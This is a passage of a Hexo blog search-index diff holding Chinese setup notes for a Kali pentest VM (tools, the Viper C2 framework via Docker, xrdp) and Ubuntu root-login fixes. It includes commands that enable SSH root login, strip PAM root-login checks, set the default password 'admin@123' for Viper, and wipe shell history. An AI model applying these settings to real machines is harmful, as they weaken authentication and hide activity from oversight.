+<li>右键应用程序 -&gt; 设置 -&gt; 电源管理器 -&gt; 显示 -&gt; 将使用电池和插入电源三个选项全部调成从不即可。</li>
+</ul>
+<h3 id="锁屏修改"><a href="#锁屏修改" class="headerlink" title="锁屏修改"></a>锁屏修改</h3><ul>
+<li>设置 -&gt; LightDM 桌面管理器 -&gt; 背景 -&gt; 进入&#x2F;usr&#x2F;share&#x2F;backgrounds&#x2F;kali -&gt; 选取一个（自定义图片会报错，我选 cubism）</li>
+</ul>
+<h3 id="自动登录（建议不用）"><a href="#自动登录（建议不用）" class="headerlink" title="自动登录（建议不用）"></a>自动登录（建议不用）</h3><ul>
+<li>首先是因为锁屏界面太丑了，改了还黑屏，那干脆去掉登录这个步骤，命令如下：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/lightdm/lightdm.conf</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">[S</span></span><br><span class="line">autologin-user=root</span><br><span class="line">autologin-user-timeout=0</span><br><span class="line"></span><br><span class="line">sudo vim /etc/pam.d/lightdm-autologin</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">注释掉如下内容</span></span><br><span class="line">auth required pam_succeed_if.so user != root quiet_success</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">重启</span></span><br><span class="line">shutdown -r now</span><br></pre></td></tr></table></figure>
+<h1 id="工具安装"><a href="#工具安装" class="headerlink" title="工具安装"></a>工具安装</h1><h2 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a>SSH</h2><ul>
+<li>输入如下命令即可：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">systemctl enable ssh ; echo &quot;PermitRootLogin yes&quot; &gt;&gt; /etc/ssh/sshd_config</span><br></pre></td></tr></table></figure>
+
+<h2 id="firefox"><a href="#firefox" class="headerlink" title="firefox"></a>firefox</h2><ul>
+<li>登入账户，自动同步即可。</li>
+<li>部分还是需要手动整理。</li>
+</ul>
+<h2 id="多版本-Java-共存"><a href="#多版本-Java-共存" class="headerlink" title="多版本 Java 共存"></a>多版本 Java 共存</h2><ul>
+<li>Kali 2023 默认 Java 版本是：openjdk 17，版本有点高会导致一些工具无法使用。</li>
+<li>下载 <code>jdk-8u301-linux-x64.tar.gz</code> 安装包，而后进行如下操作：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cp ~/Desktop/kali/jdk-8u301-linux-x64.tar.gz /usr/lib/jvm ; cd /usr/lib/jvm ; tar zxvf jdk-8u301-linux-x64.tar.gz ; rm -rf jdk-8u301-linux-x64.tar.gz</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>使用 <code>update-alternatives</code> 注册服务：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">update-alternatives --install /usr/bin/java java /usr/lib/jvm/jdk1.8.0_301/bin/java 1 ; update-alternatives --config java</span><br></pre></td></tr></table></figure>
+<h2 id="工具安装-1"><a href="#工具安装-1" class="headerlink" title="工具安装"></a>工具安装</h2><ul>
+<li>命令如下：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get install dirsearch feroxbuster lrzsz -y;</span><br></pre></td></tr></table></figure>
+
+<h2 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h2><ul>
+<li>命令如下：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl  -fsSL https://download.docker.com/linux/debian/gpg | sudo apt-key add - ; echo &#x27;deb https://download.docker.com/linux/debian stretch stable&#x27;&gt; /etc/apt/sources.list.d/docker.list ; apt-get install apt-transport-https  ca-certificates  curl  gnupg2  software-properties-common -y; apt install docker.io -y; apt install docker-compose -y</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">仓库源</span></span><br><span class="line">sudo tee /etc/docker/daemon.json &lt;&lt;-&#x27;EOF&#x27;</span><br><span class="line">&#123;</span><br><span class="line">    &quot;registry-mirrors&quot;: [&quot;https://y5u7p3c7.mirror.aliyuncs.com&quot;]</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">重启docker</span></span><br><span class="line">systemctl daemon-reload ; systemctl restart docker</span><br></pre></td></tr></table></figure>
+<h3 id="Viper"><a href="#Viper" class="headerlink" title="Viper"></a>Viper</h3><ul>
+<li>创建文件夹：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo mkdir -p ~/tools/viper;cd ~/tools/viper</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>创建docker-compose.yml文件，其中command后面跟着的是密码：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tee docker-compose.yml &lt;&lt;-&#x27;EOF&#x27;</span><br><span class="line">version: &quot;3&quot;</span><br><span class="line">services:</span><br><span class="line">  viper:</span><br><span class="line">    image: registry.cn-shenzhen.aliyuncs.com/toys/viper:latest</span><br><span class="line">    container_name: viper-c</span><br><span class="line">    network_mode: &quot;host&quot;</span><br><span class="line">    restart: always</span><br><span class="line">    volumes:</span><br><span class="line">      - ~/tools/viper/loot:/root/.msf4/loot</span><br><span class="line">      - ~/tools/viper/db:/root/viper/Docker/db</span><br><span class="line">      - ~/tools/viper/module:/root/viper/Docker/module</span><br><span class="line">      - ~/tools/viper/log:/root/viper/Docker/log</span><br><span class="line">      - ~/tools/viper/nginxconfig:/root/viper/Docker/nginxconfig</span><br><span class="line">    command: [&quot;admin@123&quot;]</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>写个快速启动脚本：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">viper-yes</span></span><br><span class="line">echo &quot;---------------------------------------------&quot;</span><br><span class="line">cd ~/tools/viper ; sudo docker-compose up -d &gt; /dev/null</span><br><span class="line">echo &quot;Success Start Viper!&quot;</span><br><span class="line">echo &quot;Username:root - Password:admin@123&quot;</span><br><span class="line">echo &quot;Login Page:https://127.0.0.1:60000&quot;</span><br><span class="line">echo &quot;---------------------------------------------&quot;</span><br><span class="line">sudo docker ps</span><br><span class="line">echo &quot;---------------------------------------------&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">viper-no</span></span><br><span class="line">echo &quot;---------------------------------------------&quot;</span><br><span class="line">cd ~/tools/viper ; sudo docker-compose down &gt; /dev/null</span><br><span class="line">echo &quot;Success Remove Vpier!&quot;</span><br><span class="line">echo &quot;---------------------------------------------&quot;</span><br><span class="line">sudo docker ps -a</span><br><span class="line">echo &quot;---------------------------------------------&quot;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>把所用命令给个权限：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">chmod -R +x ~/tools/* ; source ~/.zshrc</span><br></pre></td></tr></table></figure>
+<h2 id="xrdp"><a href="#xrdp" class="headerlink" title="xrdp"></a>xrdp</h2><ul>
+<li>有时候需要使用 windows 连接到 Kali，命令如下：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装程序</span></span><br><span class="line">apt-get -y install kali-desktop-xfce xorg xrdp -y ; sed -i &#x27;s/port=3399/port=3389/g&#x27; /etc/xrdp/xrdp.ini ; systemctl start xrdp ; systemctl enable xrdp</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>需要注意 xrdp 和 Windows 一样，同一时间只有一个用户能够登录，不然会闪退。</li>
+<li>由于设置了自动登录，需要先注销当前登录，但是 xrdp 登录后，root 的图像化就登不上了。</li>
+</ul>
+<h2 id="marktext"><a href="#marktext" class="headerlink" title="marktext"></a>marktext</h2><ul>
+<li>安装命令如下：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd ~/Desktop/kali ; dpkg -i marktext-amd64.deb </span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>修改快捷启动方式，在后面添加：<code>--no-sandbox</code></li>
+</ul>
+<h1 id="清理动作"><a href="#清理动作" class="headerlink" title="清理动作"></a>清理动作</h1><ul>
+<li>删除历史信息：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo &quot;&quot; &gt; ~/.zsh_history</span><br><span class="line">history -c</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>查看执行路径：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo $PATH</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>备注信息：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Origin</span></span><br><span class="line">kali-linux-2023.2-vmware-amd64</span><br><span class="line"></span><br><span class="line">------------------------------</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">User</span></span><br><span class="line">User/Passwd：kali/yongz</span><br><span class="line"></span><br><span class="line">------------------------------</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Change</span></span><br><span class="line">Language：zh_CN.UTF-8</span><br><span class="line">keyboard：fcitx</span><br><span class="line">SSH enabled：root login</span><br><span class="line">sources.list：(aliyun)</span><br><span class="line">Terminal：oh-my-zsh</span><br><span class="line">Copy：Ctrl+B</span><br><span class="line"></span><br><span class="line">- - - - - - - - - - - - - - - - - -</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Software</span></span><br><span class="line">dirsearch</span><br><span class="line">feroxbuster(seclists)</span><br><span class="line">Qv2ray</span><br><span class="line">java1.8</span><br><span class="line">docker：</span><br><span class="line">	Viper</span><br><span class="line"></span><br><span class="line">- - - - - - - - - - - - - - - - - -</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Creation Time</span></span><br><span class="line">2023.07.31</span><br></pre></td></tr></table></figure>
 ]]></content>
       <categories>
-        <category>Vulnhub_Kali</category>
+        <category>Linux</category>
       </categories>
       <tags>
-        <tag>Vulnhub_Kali</tag>
+        <tag>Kali</tag>
+        <tag>Linux</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Ubuntu 使用中的问题</title>
+    <url>/2023/06/28/Linux/Ubuntu/Ubuntu%20%E4%BD%BF%E7%94%A8%E4%B8%AD%E7%9A%84%E9%97%AE%E9%A2%98_20230628/</url>
+    <content><![CDATA[<ul>
+<li>最近搭环境，Ubuntu 老是出现问题，写个文章记录一下。</li>
+</ul>
+<h1 id="Ubuntu-Root-用户无法登录"><a href="#Ubuntu-Root-用户无法登录" class="headerlink" title="Ubuntu Root 用户无法登录"></a>Ubuntu Root 用户无法登录</h1><h2 id="前期提要"><a href="#前期提要" class="headerlink" title="前期提要"></a>前期提要</h2><ul>
+<li>Linux 版本：Ubuntu 20.02</li>
+<li>已进行如下配置：<ul>
+<li>apt 源已更新</li>
+<li>root 用户密码已更改</li>
+</ul>
+</li>
+</ul>
+<h2 id="解决措施"><a href="#解决措施" class="headerlink" title="解决措施"></a>解决措施</h2><ul>
+<li>当在登录界面使用 root 账户登录时，显示登录失败字样。 </li>
+<li>经过百度寻找，得出以下解决方案： <ol>
+<li>登录普通用户界面，使用<code>su root</code>切换到 root 账户；</li>
+<li>编辑<code>/etc/pam.d/gdm-autologin</code>：<code>vim /etc/pam.d/gdm-autologin</code>。</li>
+<li>将上述文件的第三行<code>auth required pam_succeed_if.so user!=root quiet_success</code>进行注释，保存退出；</li>
+<li>编辑<code>/etc/pam.d/gdm-password</code>：<code>vim /etc/pam.d/gdm-password</code>；</li>
+<li>将上述文件的第三行<code>auth required pam_succeed_if.so user!=root quiet_success</code>进行注释，保存退出；</li>
+<li>编辑<code>/root/.profile</code>：<code>vim /root/.profile</code>；</li>
+<li>将上述文件的最后几行改为：<code>tty -s&amp;&amp;mesg n 2 &gt; /dev/null || true</code>，保存退出；</li>
+<li>重启即可</li>
+</ol>
+</li>
+<li>写个脚本多快：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sed -i &#x27;3d&#x27; /etc/pam.d/gdm-autologin</span><br><span class="line">sed -i &#x27;3d&#x27; /etc/pam.d/gdm-password</span><br><span class="line"></span><br><span class="line">sed -i &#x27;9d&#x27; /root/.profile</span><br><span class="line">echo &quot;tty -s&amp;&amp;mesg n 2 &gt; /dev/null || true&quot; &gt;&gt; /root/.profile</span><br><span class="line">echo &quot;PermitRootLogin yes&quot; &gt;&gt; /etc/ssh/sshd_config</span><br><span class="line"></span><br><span class="line">apt install -y net-tools lrzsz</span><br><span class="line"></span><br><span class="line">shutdown -r now</span><br></pre></td></tr></table></figure>
+
+<h1 id="Ubuntu-关机巨慢"><a href="#Ubuntu-关机巨慢" class="headerlink" title="Ubuntu 关机巨慢"></a>Ubuntu 关机巨慢</h1><h2 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h2><ul>
+<li>虚拟机中 ubuntu18.04 关机慢，显示如下：</li>
+</ul>
+<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230831235928143.png" alt="image-20230831235928143"></p>
+<h2 id="解决措施-1"><a href="#解决措施-1" class="headerlink" title="解决措施"></a>解决措施</h2><ul>
+<li>修改系统配置文件：<code>/etc/systemd/system.conf</code>。</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">默认配置如下</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">DefaultTimeoutStartSec=90s</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">DefaultTimeoutStopSec=90s</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">修改后如下</span></span><br><span class="line"></span><br><span class="line">DefaultTimeoutStartSec=3s</span><br><span class="line">DefaultTimeoutStopSec=3s</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">重载配置</span></span><br><span class="line"></span><br><span class="line">sudo systemctl daemon-reload</span><br></pre></td></tr></table></figure>
+
+
+
+]]></content>
+      <categories>
+        <category>Linux</category>
+      </categories>
+      <tags>
+        <tag>Linux</tag>
+        <tag>Ubuntu</tag>
       </tags>
   </entry>
 </search>
